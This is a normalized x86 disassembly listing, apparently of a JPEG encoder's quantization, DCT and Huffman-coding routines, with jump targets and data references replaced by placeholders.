mov esi [ ebx + 0x3c ]
mov eax [ esp ]
lea edi [ eax + 0xc ]
jmp r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x17
mov edx [ eax ]
call [ edx ]
cmp ebp [ ebx + 0x34 ]
jl r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebx + 0xdd ]
jne r-xdata
cmp [ ebx + 0xb8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
add eax eax
cmp eax [ ebx + 0xdd ]
jne r-xdata
mov edx [ esi + 0xc ]
cmp edx [ ebx + 0xe1 ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
add eax eax
cmp eax [ ebx + 0xdd ]
jne r-xdata
mov edx [ esi + 0xc ]
cmp edx [ ebx + 0xe1 ]
jne r-xdata
cmp [ ebx + 0xb8 ] 0x0
je r-xdata
mov ecx [ ebx ]
mov eax ebx
xor edx edx
mov [ ecx + 0x14 ] 0x62
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebx + 0xdd ]
cdq
idiv [ esi + 0x8 ]
test edx edx
jne r-xdata
mov edx [ esi + 0xc ]
add edx edx
cmp edx [ ebx + 0xe1 ]
jne r-xdata
xor ecx ecx
mov [ esp + 0x4 ] ecx
mov [ edi ] sub_467f00
jmp r-xdata
mov [ edi ] sub_467eb4
jmp r-xdata
mov [ edi ] sub_4682dc
mov ecx [ esp ]
mov [ ecx + 0x8 ] 0x1
jmp r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x25
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0xe1 ]
cdq
idiv [ esi + 0xc ]
test edx edx
jne r-xdata
cmp [ ebx + 0xb8 ] 0x0
je r-xdata
add edi 0x4
inc ebp
add esi 0x54
xor ecx ecx
mov [ esp + 0x4 ] ecx
mov [ edi ] sub_467da4
jmp r-xdata
mov [ edi ] sub_467f94
jmp r-xdata
mov [ edi ] sub_46804c
mov ecx [ esp ]
mov [ ecx + 0x8 ] 0x1
jmp r-xdata
sub_4685f4
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
xor ecx ecx
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x15d ]
mov [ esp + 0x4 ] edx
mov [ esp + 0x8 ] ecx
mov eax [ esp ]
mov edx [ eax + 0x3c ]
mov [ esp + 0xc ] edx
jmp r-xdata
mov ecx [ esp ]
mov eax [ ecx + 0x34 ]
cmp eax [ esp + 0x8 ]
jg r-xdata
mov ecx [ esp + 0xc ]
mov ebx [ ecx + 0x10 ]
test ebx ebx
jl r-xdata
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ esp ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x33
mov [ eax + 0x18 ] ebx
mov eax [ esp ]
mov edx [ eax ]
call [ edx ]
cmp ebx 0x4
jge r-xdata
mov eax [ esp + 0x4 ]
cmp [ eax + ebx * 4 + 0xc ] 0x0
jne r-xdata
je r-xdata
mov eax [ esp ]
cmp [ eax + ebx * 4 + 0x40 ] 0x0
jne r-xdata
mov eax [ esp + 0x4 ]
mov edx [ eax + ebx * 4 + 0xc ]
xor eax eax
mov ecx edx
mov edx [ esp + 0x10 ]
mov eax [ esp ]
mov ecx 0x100
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov edx [ esp + 0x4 ]
mov [ edx + ebx * 4 + 0xc ] eax
mov eax [ esp + 0x4 ]
cmp [ eax + ebx * 4 + 0xc ] 0x0
jne r-xdata
dec ecx
je r-xdata
mov ecx [ esp ]
mov eax [ ecx + ebx * 4 + 0x40 ]
mov [ esp + 0x10 ] eax
mov edx [ esp ]
mov ecx [ edx + 0xbc ]
sub ecx 0x1
jb r-xdata
movzx ebx [ edx ]
shl ebx 0x3
mov [ ecx ] ebx
inc eax
add ecx 0x4
add edx 0x2
cmp eax 0x40
jl r-xdata
jmp r-xdata
mov eax [ esp + 0x4 ]
mov ecx rw-data
mov edx [ eax + ebx * 4 + 0xc ]
xor eax eax
mov ebx edx
mov edx [ esp + 0x10 ]
mov eax [ esp ]
mov ecx 0x100
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov edx [ esp + 0x4 ]
mov [ edx + ebx * 4 + 0xc ] eax
mov eax [ esp + 0x4 ]
cmp [ eax + ebx * 4 + 0x20 ] 0x0
jne r-xdata
jmp r-xdata
inc [ esp + 0x8 ]
add [ esp + 0xc ] 0x54
movsx edi [ ecx ]
movzx esi [ edx ]
imul esi edi
add esi 0x400
add edx 0x2
sar esi 0xb
add ecx 0x2
mov [ ebx ] esi
add ebx 0x4
inc eax
cmp eax 0x40
jl r-xdata
jmp r-xdata
mov eax [ esp + 0x4 ]
mov ecx [ eax + ebx * 4 + 0x20 ]
xor eax eax
xor edx edx
mov [ esp + 0x14 ] ecx
mov [ esp + 0x18 ] edx
mov [ esp + 0x1c ] rw-data
mov eax [ esp ]
mov ecx 0x100
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov edx [ esp + 0x4 ]
mov [ edx + ebx * 4 + 0x20 ] eax
mov eax [ esp ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x2f
mov eax [ esp ]
mov edx [ eax ]
call [ edx ]
movzx ebp [ edx ]
mov [ esp + 0x20 ] ebp
fild [ esp + 0x20 ]
fmul [ edi ]
fmul [ ecx ]
fmul [ r-xdata ]
fdivr [ r-xdata ]
fstp [ ebx ]
inc eax
add ebx 0x4
add edx 0x2
inc esi
add ecx 0x8
cmp esi 0x8
jl r-xdata
inc [ esp + 0x18 ]
add [ esp + 0x1c ] 0x8
cmp [ esp + 0x18 ] 0x8
jl r-xdata
xor esi esi
mov edx [ esp + 0x14 ]
lea ebx [ edx + eax * 4 ]
mov ecx rw-data
mov edx [ esp + 0x1c ]
mov edi edx
mov edx [ esp + 0x10 ]
lea edx [ edx + eax * 2 ]
jmp r-xdata
sub_468800
push ebp
mov ebp esp
add esp 0xfffffee4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov eax [ eax + 0x15d ]
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x8 ] ecx
mov edx [ edx + 0x10 ]
mov eax [ eax + edx * 4 + 0xc ]
xor edx edx
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x10 ]
shl eax 0x2
add [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] edx
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp + 0x8 ]
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x11c ]
mov ecx eax
xor ebx ebx
mov eax [ ecx ]
add ecx 0x4
add eax [ ebp + 0xc ]
inc ebx
movzx esi [ eax ]
inc eax
add esi 0xffffff80
mov [ edx ] esi
add edx 0x4
movzx esi [ eax ]
inc eax
add esi 0xffffff80
mov [ edx ] esi
add edx 0x4
movzx esi [ eax ]
inc eax
add esi 0xffffff80
mov [ edx ] esi
add edx 0x4
movzx esi [ eax ]
inc eax
add esi 0xffffff80
mov [ edx ] esi
add edx 0x4
movzx esi [ eax ]
inc eax
add esi 0xffffff80
mov [ edx ] esi
add edx 0x4
movzx esi [ eax ]
inc eax
add esi 0xffffff80
mov [ edx ] esi
add edx 0x4
movzx esi [ eax ]
inc eax
add esi 0xffffff80
mov [ edx ] esi
add edx 0x4
movzx eax [ eax ]
add eax 0xffffff80
mov [ edx ] eax
add edx 0x4
cmp ebx 0x8
jl r-xdata
lea eax [ ebp - 0x11c ]
call [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
shl eax 0x7
add eax [ ebp + 0x14 ]
xor edx edx
mov [ ebp - 0x14 ] edx
mov ecx eax
mov [ ebp - 0x1c ] ecx
lea eax [ ebp - 0x11c ]
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0xc ]
mov esi edx
mov eax edi
sar eax 0x1
add ebx eax
cmp edi ebx
jg r-xdata
neg ebx
mov eax edi
sar eax 0x1
add ebx eax
cmp edi ebx
jg r-xdata
xor ebx ebx
mov eax ebx
cdq
idiv edi
mov ebx eax
jmp r-xdata
xor ebx ebx
mov eax ebx
cdq
idiv edi
mov ebx eax
jmp r-xdata
mov edi [ esi ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
test ebx ebx
jge r-xdata
inc [ ebp - 0x10 ]
add [ ebp + 0xc ] 0x8
mov edx [ ebp - 0x10 ]
cmp edx [ ebp + 0x8 ]
jb r-xdata
mov eax [ ebp - 0x1c ]
add esi 0x4
mov [ eax ] bx
inc [ ebp - 0x14 ]
add [ ebp - 0x1c ] 0x2
add [ ebp - 0x18 ] 0x4
cmp [ ebp - 0x14 ] 0x40
jl r-xdata
neg ebx
jmp r-xdata
sub_468954
push ebp
mov ebp esp
add esp 0xfffffee4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov eax [ eax + 0x15d ]
mov ecx [ eax + 0x1c ]
mov [ ebp - 0x8 ] ecx
mov edx [ edx + 0x10 ]
mov eax [ eax + edx * 4 + 0x20 ]
xor edx edx
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x10 ]
shl eax 0x2
add [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] edx
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp + 0x8 ]
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x118 ]
mov ecx eax
xor ebx ebx
mov eax [ ecx ]
add ecx 0x4
add eax [ ebp + 0xc ]
inc ebx
movzx esi [ eax ]
add esi 0xffffff80
inc eax
mov [ ebp - 0x11c ] esi
fild [ ebp - 0x11c ]
fstp [ edx ]
movzx esi [ eax ]
add esi 0xffffff80
add edx 0x4
mov [ ebp - 0x11c ] esi
inc eax
fild [ ebp - 0x11c ]
fstp [ edx ]
movzx esi [ eax ]
add esi 0xffffff80
add edx 0x4
mov [ ebp - 0x11c ] esi
inc eax
fild [ ebp - 0x11c ]
fstp [ edx ]
movzx esi [ eax ]
add esi 0xffffff80
add edx 0x4
mov [ ebp - 0x11c ] esi
inc eax
fild [ ebp - 0x11c ]
fstp [ edx ]
movzx esi [ eax ]
add esi 0xffffff80
add edx 0x4
mov [ ebp - 0x11c ] esi
inc eax
fild [ ebp - 0x11c ]
fstp [ edx ]
movzx esi [ eax ]
add esi 0xffffff80
add edx 0x4
mov [ ebp - 0x11c ] esi
inc eax
fild [ ebp - 0x11c ]
fstp [ edx ]
movzx esi [ eax ]
add esi 0xffffff80
add edx 0x4
mov [ ebp - 0x11c ] esi
inc eax
fild [ ebp - 0x11c ]
fstp [ edx ]
movzx eax [ eax ]
add eax 0xffffff80
add edx 0x4
mov [ ebp - 0x11c ] eax
fild [ ebp - 0x11c ]
fstp [ edx ]
add edx 0x4
cmp ebx 0x8
jl r-xdata
lea eax [ ebp - 0x118 ]
call [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
lea ebx [ ebp - 0x118 ]
shl eax 0x7
add eax [ ebp + 0x14 ]
xor edx edx
mov [ ebp - 0x18 ] edx
mov edi eax
mov eax [ ebp - 0xc ]
mov esi eax
fld [ ebx ]
fmul [ esi ]
fstp [ ebp - 0x14 ]
fld [ ebp - 0x14 ]
fadd [ r-xdata ]
call sub_46a384
add ax 0xc000
add esi 0x4
mov [ edi ] ax
add edi 0x2
inc [ ebp - 0x18 ]
add ebx 0x4
cmp [ ebp - 0x18 ] 0x40
jl r-xdata
inc [ ebp - 0x10 ]
add [ ebp + 0xc ] 0x8
mov edx [ ebp - 0x10 ]
cmp edx [ ebp + 0x8 ]
jb r-xdata
sub_468ae4
push ebx
push esi
mov esi eax
mov ecx 0x30
mov edx 0x1
mov eax esi
mov ebx [ eax + 0x4 ]
call [ ebx ]
mov ebx eax
mov [ esi + 0x15d ] ebx
mov [ ebx ] sub_4685f4
mov eax [ esi + 0xbc ]
sub eax 0x1
jb r-xdata
mov [ ebx + 0x4 ] sub_468800
mov [ ebx + 0x8 ] sub_46c69c
jmp r-xdata
je r-xdata
xor edx edx
lea eax [ ebx + 0xc ]
mov [ ebx + 0x4 ] sub_468800
mov [ ebx + 0x8 ] sub_46ca80
jmp r-xdata
dec eax
je r-xdata
xor ecx ecx
inc edx
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x14 ] ecx
add eax 0x4
cmp edx 0x4
jl r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x4 ] sub_468954
mov [ ebx + 0x1c ] sub_46ccec
jmp r-xdata
jmp r-xdata
mov edx [ esi ]
mov eax esi
mov [ edx + 0x14 ] 0x2f
mov edx [ eax ]
call [ edx ]
sub_468b74
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov esi eax
mov [ esp ] edx
mov edi [ esi + 0x161 ]
mov [ edi + 0x20 ] esi
mov eax [ esp ]
mov [ edi + 0xc ] eax
cmp [ esi + 0x131 ] 0x0
sete dl
and edx 0x1
mov [ esp + 0x4 ] edx
cmp [ esi + 0x139 ] 0x0
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov [ edi + 0x4 ] sub_4692c8
cmp [ edi + 0x40 ] 0x0
jne r-xdata
mov [ edi + 0x4 ] sub_469220
jmp r-xdata
mov [ edi + 0x4 ] sub_46908c
jmp r-xdata
mov [ edi + 0x4 ] sub_468f60
jmp r-xdata
cmp [ esp ] 0x0
je r-xdata
mov eax esi
mov ecx 0x3e8
mov edx 0x1
mov ebx [ eax + 0x4 ]
call [ ebx ]
mov [ edi + 0x40 ] eax
mov [ edi + 0x8 ] sub_469520
mov [ edi + 0x8 ] sub_46955c
jmp r-xdata
mov edx [ esp + 0x8 ]
cmp edx [ esi + 0xe9 ]
jl r-xdata
xor eax eax
mov [ esp + 0x8 ] eax
lea edx [ edi + 0x24 ]
mov [ esp + 0x10 ] edx
lea ecx [ esi + 0xed ]
mov [ esp + 0xc ] ecx
jmp r-xdata
mov eax [ esp + 0xc ]
mov edx [ esp + 0x10 ]
xor ecx ecx
mov eax [ eax ]
mov [ edx ] ecx
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor ecx ecx
xor eax eax
mov [ edi + 0x38 ] ecx
mov [ edi + 0x3c ] eax
xor edx edx
xor ecx ecx
mov [ edi + 0x18 ] edx
mov [ edi + 0x1c ] ecx
mov eax [ esi + 0xc0 ]
xor edx edx
mov [ edi + 0x44 ] eax
mov [ edi + 0x48 ] edx
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x18 ]
mov [ edi + 0x34 ] ebx
test ebx ebx
jl r-xdata
cmp [ esi + 0x139 ] 0x0
jne r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x31
mov [ eax + 0x18 ] ebx
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp ebx 0x4
jge r-xdata
inc [ esp + 0x8 ]
add [ esp + 0x10 ] 0x4
add [ esp + 0xc ] 0x4
mov ebx [ eax + 0x14 ]
test ebx ebx
jl r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ edi + ebx * 4 + 0x5c ] 0x0
jne r-xdata
cmp [ esi + ebx * 4 + 0x60 ] 0x0
jne r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x31
mov [ eax + 0x18 ] ebx
mov eax esi
mov edx [ eax ]
call [ edx ]
jmp r-xdata
cmp ebx 0x4
jge r-xdata
lea ecx [ edi + ebx * 4 + 0x4c ]
mov edx [ esi + ebx * 4 + 0x60 ]
mov eax esi
call sub_46982c
lea ecx [ edi + ebx * 4 + 0x4c ]
mov edx [ esi + ebx * 4 + 0x50 ]
mov eax esi
call sub_46982c
jmp r-xdata
push 0x404
push 0x0
mov eax [ edi + ebx * 4 + 0x5c ]
push eax
call sub_46a318
add esp 0xc
jmp r-xdata
mov eax esi
mov ecx 0x404
mov edx 0x1
mov ebp [ eax + 0x4 ]
call [ ebp ]
mov [ edi + ebx * 4 + 0x5c ] eax
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
cmp [ esi + ebx * 4 + 0x50 ] 0x0
jne r-xdata
cmp [ esp ] 0x0
jne r-xdata
sub_468d4c
push ebx
mov ebx eax
push esi
mov eax [ ebx + 0x20 ]
mov esi [ eax + 0x14 ]
call [ esi + 0xc ]
test eax eax
jne r-xdata
mov ecx [ esi ]
mov [ ebx + 0x10 ] ecx
mov eax [ esi + 0x4 ]
mov [ ebx + 0x14 ] eax
pop esi
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x16
mov edx [ eax ]
call [ edx ]
sub_468d7c
push ebx
mov ebx eax
push esi
push edi
push ebp
mov edi ecx
test edi edi
mov ebp [ ebx + 0x1c ]
mov esi edx
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x27
mov edx [ eax ]
call [ edx ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx edi
mov eax 0x1
shl eax cl
dec eax
add ebp edi
mov ecx 0x18
and esi eax
sub ecx ebp
shl esi cl
or esi [ ebx + 0x18 ]
cmp ebp 0x8
jl r-xdata
mov [ ebx + 0x18 ] esi
mov [ ebx + 0x1c ] ebp
mov edi esi
mov edx [ ebx + 0x10 ]
sar edi 0x10
inc [ ebx + 0x10 ]
and edi 0xff
mov eax edi
mov [ edx ] al
dec [ ebx + 0x14 ]
jne r-xdata
cmp edi 0xff
jne r-xdata
mov eax ebx
call sub_468d4c
shl esi 0x8
sub ebp 0x8
cmp ebp 0x8
jge r-xdata
mov edx [ ebx + 0x10 ]
inc [ ebx + 0x10 ]
mov [ edx ] 0x0
dec [ ebx + 0x14 ]
jne r-xdata
mov eax ebx
call sub_468d4c
sub_468e38
push ebx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx [ eax + edx * 4 + 0x4c ]
mov ebx [ edx + ecx * 4 ]
movsx edx [ edx + ecx + 0x400 ]
mov ecx edx
mov edx ebx
call sub_468d7c
pop ebx
retn
mov eax [ eax + edx * 4 + 0x5c ]
inc [ eax + ecx * 4 ]
pop ebx
retn
sub_468e64
push ebx
push esi
push edi
mov edi eax
mov esi ecx
mov ebx edx
cmp [ edi + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
jbe r-xdata
movsx edx [ ebx ]
mov ecx 0x1
mov eax edi
call sub_468d7c
inc ebx
dec esi
test esi esi
ja r-xdata
sub_468e90
push ebx
mov ebx eax
push esi
mov eax [ ebx + 0x38 ]
test eax eax
jbe r-xdata
pop esi
pop ebx
retn
xor esi esi
jmp r-xdata
sar eax 0x1
jne r-xdata
inc esi
mov ecx esi
shl ecx 0x4
mov edx [ ebx + 0x34 ]
mov eax ebx
call sub_468e38
test esi esi
je r-xdata
xor eax eax
mov [ ebx + 0x38 ] eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x40 ]
mov eax ebx
call sub_468e64
xor edx edx
mov [ ebx + 0x3c ] edx
mov ecx esi
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_468d7c
sub_468ee0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_468e90
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x20 ]
cmp [ edx + 0x131 ] 0x0
jne r-xdata
mov eax ebx
call sub_468e18
mov edx [ ebx + 0x10 ]
inc [ ebx + 0x10 ]
mov [ edx ] 0xff
dec [ ebx + 0x14 ]
jne r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x38 ] eax
mov [ ebx + 0x3c ] edx
pop esi
pop ebx
retn
xor edx edx
lea eax [ ebx + 0x24 ]
jmp r-xdata
mov ecx [ ebx + 0x10 ]
mov edx esi
inc [ ebx + 0x10 ]
add dl 0xd0
mov [ ecx ] dl
dec [ ebx + 0x14 ]
jne r-xdata
mov eax ebx
call sub_468d4c
mov ecx [ ebx + 0x20 ]
cmp edx [ ecx + 0xe9 ]
jl r-xdata
mov eax ebx
call sub_468d4c
xor ecx ecx
inc edx
mov [ eax ] ecx
add eax 0x4
pop esi
pop ebx
retn
sub_468f60
push ebx
push esi
push edi
add esp 0xffffffe8
mov ebx edx
mov [ esp ] eax
mov eax [ esp ]
mov esi [ eax + 0x161 ]
mov eax [ esp ]
mov edx [ eax + 0x13d ]
mov [ esp + 0x8 ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x14 ]
mov edx [ eax ]
mov [ esi + 0x10 ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x14 ]
mov edx [ eax + 0x4 ]
mov [ esi + 0x14 ] edx
mov ecx [ esp ]
cmp [ ecx + 0xc0 ] 0x0
je r-xdata
xor ecx ecx
mov [ esp + 0x4 ] ecx
mov eax [ esp ]
lea edx [ eax + 0x109 ]
mov [ esp + 0x14 ] edx
mov ecx ebx
mov [ esp + 0x10 ] ecx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x105 ]
cmp ecx [ esp + 0x4 ]
jg r-xdata
mov edx [ esi + 0x48 ]
mov eax esi
call sub_468ee0
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp ]
mov edx [ edx ]
mov eax [ eax ]
mov ecx [ ecx + edx * 4 + 0xed ]
mov [ esp + 0xc ] ecx
movsx edi [ eax ]
mov ecx [ esp + 0x8 ]
sar edi cl
mov eax edi
sub eax [ esi + edx * 4 + 0x24 ]
mov [ esi + edx * 4 + 0x24 ] edi
mov edi eax
test eax eax
jge r-xdata
mov edx [ esi + 0x10 ]
mov eax [ esp ]
mov eax [ eax + 0x14 ]
mov [ eax ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x4 ] edx
mov ecx [ esp ]
mov eax [ ecx + 0xc0 ]
test eax eax
je r-xdata
xor ebx ebx
test eax eax
je r-xdata
neg eax
dec edi
mov eax 0x1
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x44 ] 0x0
jne r-xdata
mov eax [ esp + 0xc ]
mov edx [ eax + 0x14 ]
mov ecx ebx
mov eax esi
call sub_468e38
test ebx ebx
je r-xdata
sar eax 0x1
inc ebx
test eax eax
jne r-xdata
dec [ esi + 0x44 ]
mov [ esi + 0x44 ] eax
inc [ esi + 0x48 ]
and [ esi + 0x48 ] 0x7
inc [ esp + 0x4 ]
add [ esp + 0x14 ] 0x4
add [ esp + 0x10 ] 0x4
mov ecx ebx
mov edx edi
mov eax esi
call sub_468d7c
sub_46908c
push ebx
push esi
push edi
push ebp
add esp 0xffffffe4
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
mov ebx [ eax + 0x161 ]
mov eax [ esp ]
mov edx [ eax + 0x135 ]
mov [ esp + 0xc ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x13d ]
mov [ esp + 0x10 ] eax
mov edx [ esp ]
mov ecx [ edx + 0x14 ]
mov eax [ ecx ]
mov [ ebx + 0x10 ] eax
mov edx [ esp ]
mov ecx [ edx + 0x14 ]
mov eax [ ecx + 0x4 ]
mov [ ebx + 0x14 ] eax
mov edx [ esp ]
cmp [ edx + 0xc0 ] 0x0
je r-xdata
mov ecx [ esi ]
mov [ esp + 0x14 ] ecx
xor esi esi
mov eax [ esp ]
mov edx [ eax + 0x131 ]
mov [ esp + 0x8 ] edx
mov ecx [ esp + 0x8 ]
lea eax [ ecx * 4 + rw-data ]
mov [ esp + 0x18 ] eax
mov edx [ esp + 0x8 ]
cmp edx [ esp + 0xc ]
jg r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
test esi esi
jle r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ ecx ]
mov edx [ esp + 0x14 ]
movsx edi [ edx + eax * 2 ]
test edi edi
jne r-xdata
mov edx [ ebx + 0x48 ]
mov eax ebx
call sub_468ee0
mov edx [ esp ]
mov eax [ edx + 0x14 ]
mov edx [ ebx + 0x10 ]
mov [ eax ] edx
mov ecx [ ebx + 0x14 ]
mov [ eax + 0x4 ] ecx
mov eax [ esp ]
mov eax [ eax + 0xc0 ]
test eax eax
je r-xdata
inc [ ebx + 0x38 ]
cmp [ ebx + 0x38 ] 0x7fff
jne r-xdata
test edi edi
jge r-xdata
inc esi
jmp r-xdata
mov eax 0x1
add esp 0x1c
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax ebx
call sub_468e90
mov ecx [ esp + 0x10 ]
sar edi cl
mov [ esp + 0x4 ] edi
neg edi
mov ecx [ esp + 0x10 ]
sar edi cl
mov eax edi
not eax
mov [ esp + 0x4 ] eax
jmp r-xdata
inc [ esp + 0x8 ]
add [ esp + 0x18 ] 0x4
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0xc ]
jle r-xdata
dec [ ebx + 0x44 ]
mov [ ebx + 0x44 ] eax
inc [ ebx + 0x48 ]
and [ ebx + 0x48 ] 0x7
cmp [ ebx + 0x38 ] 0x0
jbe r-xdata
inc esi
jmp r-xdata
test edi edi
jne r-xdata
cmp esi 0xf
jle r-xdata
mov eax ebx
call sub_468e90
mov ebp 0x1
jmp r-xdata
mov ecx 0xf0
mov edx [ ebx + 0x34 ]
mov eax ebx
call sub_468e38
sub esi 0x10
cmp esi 0xf
jg r-xdata
sar edi 0x1
jne r-xdata
inc ebp
mov ecx esi
mov edx [ ebx + 0x34 ]
shl ecx 0x4
mov eax ebx
add ecx ebp
call sub_468e38
mov ecx ebp
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_468d7c
xor esi esi
sub_469220
push ebx
push esi
mov ebx eax
push edi
push ebp
push ecx
mov esi [ ebx + 0x161 ]
mov eax [ ebx + 0x13d ]
mov [ esp ] eax
mov edi edx
mov edx [ ebx + 0x14 ]
mov ecx [ edx ]
mov [ esi + 0x10 ] ecx
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x4 ]
mov [ esi + 0x14 ] edx
cmp [ ebx + 0xc0 ] 0x0
je r-xdata
xor ebp ebp
mov eax edi
mov edi eax
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
cmp ebp [ ebx + 0x105 ]
jl r-xdata
mov edx [ esi + 0x48 ]
mov eax esi
call sub_468ee0
mov eax [ edi ]
mov ecx [ esp ]
movsx edx [ eax ]
mov eax edx
mov edx eax
mov eax esi
sar edx cl
mov ecx 0x1
call sub_468d7c
inc ebp
add edi 0x4
mov eax [ ebx + 0x14 ]
mov edx [ esi + 0x10 ]
mov [ eax ] edx
mov ecx [ esi + 0x14 ]
mov [ eax + 0x4 ] ecx
mov eax [ ebx + 0xc0 ]
test eax eax
je r-xdata
mov eax 0x1
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x44 ] 0x0
jne r-xdata
dec [ esi + 0x44 ]
mov [ esi + 0x44 ] eax
inc [ esi + 0x48 ]
and [ esi + 0x48 ] 0x7
sub_4692c8
push ebx
push esi
push edi
push ebp
add esp 0xfffffee0
mov edi edx
mov [ esp ] eax
mov eax [ esp ]
mov ebx [ eax + 0x161 ]
mov eax [ esp ]
mov edx [ eax + 0x135 ]
mov [ esp + 0x10 ] edx
mov eax [ esp ]
mov ecx [ esp ]
mov edx [ eax + 0x14 ]
mov esi [ ecx + 0x13d ]
mov ecx [ edx ]
mov [ ebx + 0x10 ] ecx
mov eax [ esp ]
mov edx [ eax + 0x14 ]
mov ecx [ edx + 0x4 ]
mov [ ebx + 0x14 ] ecx
mov eax [ esp ]
cmp [ eax + 0xc0 ] 0x0
je r-xdata
mov edx [ edi ]
xor ecx ecx
mov [ esp + 0x14 ] edx
mov [ esp + 0xc ] ecx
mov eax [ esp ]
mov edx [ eax + 0x131 ]
mov [ esp + 0x8 ] edx
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
lea edx [ esp + ecx * 4 + 0x20 ]
mov ecx [ esp + 0x8 ]
cmp ecx [ esp + 0x10 ]
lea eax [ eax * 4 + rw-data ]
jg r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ esp ]
mov ebp [ ebx + 0x40 ]
add ebp [ ebx + 0x3c ]
xor edi edi
mov edx [ eax + 0x131 ]
xor esi esi
mov [ esp + 0x8 ] edx
mov ecx [ esp + 0x8 ]
lea eax [ ecx * 4 + rw-data ]
mov [ esp + 0x1c ] eax
mov edx [ esp + 0x8 ]
lea ecx [ esp + edx * 4 + 0x20 ]
mov [ esp + 0x18 ] ecx
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x10 ]
jg r-xdata
mov ecx [ eax ]
mov edi [ esp + 0x14 ]
movsx ecx [ edi + ecx * 2 ]
mov [ esp + 0x4 ] ecx
cmp [ esp + 0x4 ] 0x0
jge r-xdata
mov edx [ ebx + 0x48 ]
mov eax ebx
call sub_468ee0
test edi edi
jg r-xdata
mov edx [ esp + 0x18 ]
mov ecx [ edx ]
mov [ esp + 0x4 ] ecx
test ecx ecx
jne r-xdata
mov ecx esi
sar [ esp + 0x4 ] cl
mov ecx [ esp + 0x4 ]
mov [ edx ] ecx
cmp [ esp + 0x4 ] 0x1
jne r-xdata
neg [ esp + 0x4 ]
inc [ ebx + 0x38 ]
add [ ebx + 0x3c ] esi
cmp [ ebx + 0x38 ] 0x7fff
je r-xdata
test esi esi
jbe r-xdata
